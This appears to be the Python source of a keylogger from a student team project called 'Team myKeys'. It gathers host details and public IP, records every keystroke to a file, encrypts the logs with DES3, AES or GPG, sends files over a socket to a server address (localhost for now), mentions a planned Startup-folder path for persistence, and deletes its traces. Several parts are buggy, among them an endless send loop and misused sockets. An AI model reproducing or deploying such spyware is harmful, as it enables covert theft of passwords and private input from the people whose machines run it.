# Team myKeys
# keylogger.py
# Connor Blaszkiewicz and Neta Shiff

# Libraries Used
import base64
import socket
import platform

import gnupg
from Cryptodome import Random
from Cryptodome.Cipher import DES3, AES
from Cryptodome.Random import get_random_bytes
from pynput.keyboard import Key, Listener
import time
import os
import getpass
from requests import get
import multiprocessing

# varubales for AES:
BS = 16
PAD = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode('utf-8')
UNPAD = lambda s: s[:-ord(s[len(s) - 1:])]
BLOCK_SIZE = 128

loggedKeys = "loggedKeys.txt"
systemInfo = "systemInfo.txt"

loggedKeysEncrypted = "loggedKeysEncrypted.txt"
systemInfoEncrypted = "systemInfoEncrypted.txt"

## Networking Variables
udpPort = 25005
buffer_size = 1024
server_ip = "127.0.0.1"  # local testing

path = ""  # "C:\Users\default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" will go here eventually?
extend = "\\"
extendedPath = path + extend


### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
def sendFile(filename):
    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    f = open(filename, 'rb')
    l = f.read(buffer_size)
    while (l):
        clientsocket.sendto(l.encode(), (server_ip, udpPort))
    f.close()
    clientsocket.close()


### This creates a document that contains useful system information and specifications ###
def getSystemInfo():
    # needs error handling
    with open(extendedPath + systemInfo, "a") as f:
        hostname = socket.gethostname()
        # Writes hostname
        f.write("Hostname: " + hostname + '\n')

        privateIP = socket.gethostbyname(hostname)
        try:
            publicIP = get("https://api.ipify.org").text
            f.write("Public IP address: " + publicIP + '\n')

        except Exception:
            f.write("ERROR: could not retrieve public IP address" + '\n')

        # Writes Private IP
        f.write("private IP address: " + privateIP + '\n')
        # Writes Machine Name
        f.write("Machine: " + platform.machine() + '\n')
        # Writes System Type
        f.write("System: " + platform.system() + '\n')
        # Writes System Version
        f.write("Version: " + platform.version() + '\n')
        # Writes Processor
        f.write("Processor: " + platform.processor() + '\n')


getSystemInfo()

### Run Length Variables ###
numberOfLogs = 0
logTime = 15  # This should be changed to 24 hours equivalent (I think)
currentTime = time.time()
endTime = currentTime + logTime  # Will result in 24 hours after currentTime

### Establishes how long the program will record keys ###
### All Key Recording Processes are below ###
while currentTime < endTime:
    count = 0
    keys = []


    ### When a key is pressed ###
    def onPress(key):
        global keys
        global count
        global currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            writeToFile(keys)
            keys = []


    ### Writes keys to file ###
    def writeToFile(keys):
        # needs error handling
        with open(extendedPath + loggedKeys, "a") as f:
            for key in keys:
                k = str(key.replace("'", ""))
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    ### When a key is released ###
    def onRelease(key):
        # This may not be needed
        if key == Key.esc:
            return False
        if currentTime > endTime:
            return False


    with Listener(onPress=onPress, onRelease=onRelease) as listener:
        listener.join()

    if currentTime > endTime:
        # needs error handling
        with open(extendedPath + loggedKeys, "w") as f:
            f.write()

        numberOfLogs += 1

        currentTime = time.time()
        endTime = time.time() + logTime


# encrypt files
def des3_encrypt(original_file, encrypt_file):
    with open(original_file, 'rb') as files:
        data = files.read()
    iv = Random.new().read(DES3.block_size)  # DES3.block_size==8
    key = DES3.adjust_key_parity(get_random_bytes(24))
    cipher_encrypt = DES3.new(key, DES3.MODE_OFB, iv)
    pad_len = 8 - len(data) % 8
    # length of padding
    padding = chr(pad_len) * pad_len
    # PKCS5 padding content
    data += padding.encode('utf-8')
    encrypted_text = cipher_encrypt.encrypt(data)
    with open(encrypt_file, 'wb') as f:
        f.write(encrypted_text)
    return key, iv


def encrypt_aes(original_file, encrypt_file):
    # encrypt the file with the key and aes and return the encrypt text
    key = os.urandom(16)
    print(key)
    with open(original_file, 'rb') as files:
        data = files.read()
    new_text = PAD(data)
    iv = Random.new().read(BS)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    with open(encrypt_file, 'wb') as f:
        f.write(base64.b64encode(iv + cipher.encrypt(new_text)))
    return key


def encrypt_gnupg(original_file, encrypt_file, email, pashprase):
    # encrypt file name original_file
    # output in the dir and the encrypt file that we entered
    gpg = gnupg.GPG(gnupghome='C:\\Program Files (x86)\\GnuPG\\bin',
                    gpgbinary='C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe')
    input_data = gpg.gen_key_input(key_type="RSA",
                                   key_length=2048,
                                   name_email=email,
                                   passphrase=pashprase)
    key = gpg.gen_key(input_data)
    print(key)
    with open(original_file, 'rb') as f:
        status = gpg.encrypt_file(
            f, recipients=[email],
            output=encrypt_file + '.gpg')
    return key



### Deletes Files After they are Encrypted and Sent ###
deleteFiles = [systemInfo, loggedKeys]
for file in deleteFiles:
    os.remove(extendedPath + file)
